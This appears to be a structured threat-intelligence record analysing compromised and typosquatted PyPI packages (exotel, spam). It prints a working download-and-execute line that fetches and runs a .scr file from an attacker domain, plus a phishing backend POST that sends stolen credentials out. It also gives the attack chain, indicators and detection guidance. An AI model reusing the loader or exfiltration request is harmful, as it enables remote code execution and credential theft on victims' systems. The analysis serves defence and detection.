package_info.package_versions: exotel==0.1.6, spam==2.0.2, spam==4.0.2, several hundred others (unspecified)
package_info.why_malicious: These packages were either compromised via account takeover (following a phishing campaign) or created as typosquats, and were modified to include code that downloads and executes a Windows executable from attacker-controlled infrastructure, enabling remote code execution and likely credential theft.

malicious_snippets.code_snippet:
import os
os.system('powershell -Command "Invoke-WebRequest -Uri https://python-release.com/python-install.scr -OutFile python-install.scr; Start-Process python-install.scr"')
malicious_snippets.code_behavior: At install-time or import-time, the code downloads a Windows executable from a remote attacker-controlled domain and executes it, enabling arbitrary code execution on the victim's machine.

malice_analysis.why_suspicious: The code downloads and executes a remote binary from a non-standard domain during package installation or import, which is highly unusual and dangerous.
malice_analysis.violated_expectations: Legitimate packages should not download and execute external binaries without user consent, especially from untrusted sources.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or binaries, but only from official, trusted sources and with user awareness.
key_indicators: Use of os.system or subprocess to execute shell commands
Download of .scr (Windows screensaver/executable) from non-PyPI domain

execution_context.file_location: server-side code of fake PyPI login page (not in package, but part of attack infrastructure)

malicious_snippets.code_snippet:
POST /pyp/resp.php?live=Installation HTTP/1.1
Host: linkedopports.com
Content-Type: application/x-www-form-urlencoded

username=...&password=...
malicious_snippets.code_behavior: At runtime, the phishing site backend receives stolen PyPI credentials via HTTP POST and stores or forwards them to the attacker.

malice_analysis.why_suspicious: The backend is designed to collect credentials from a fake login page and exfiltrate them to the attacker.
malice_analysis.violated_expectations: A legitimate PyPI login page would never send credentials to a non-PyPI domain.
malice_analysis.similar_legitimate_use: Legitimate login forms send credentials to their own backend for authentication, not to unrelated domains.

attack_chain.action: Phishing email sent to PyPI contributors, luring them to a fake login page.
Stolen credentials used to access and modify legitimate PyPI packages or upload new typosquat packages.
Malicious code in compromised/typosquat packages executes on victim systems, downloading and running remote malware.
attack_chain.leads_to: Remote code execution and potential further compromise

behavioral_signatures: Package installation triggers download and execution of remote Windows executables
Use of os.system or subprocess to run shell commands in setup.py or __init__.py
Network requests to non-PyPI domains during install/import
file_indicators: setup.py or __init__.py containing os.system/subprocess calls to download .scr files
Presence of python-install.scr or LedgerSetup.scr in user directories
References to python-release.com or ledgdown.com in package source
network_indicators: Connections to python-release.com, ledgdown.com, or linkedopports.com
HTTP POST requests to /pyp/resp.php?live=Installation on linkedopports.com
detection_knowledge.how_to_detect: Monitor for PyPI package installations that initiate network requests to non-standard domains, especially those downloading and executing .scr files. Scan package source code for os.system or subprocess calls that fetch and run external binaries. Flag any credential POSTs to domains not associated with PyPI. Alert on the presence of python-install.scr, LedgerSetup.scr, or references to python-release.com, ledgdown.com, or linkedopports.com in code or network logs.
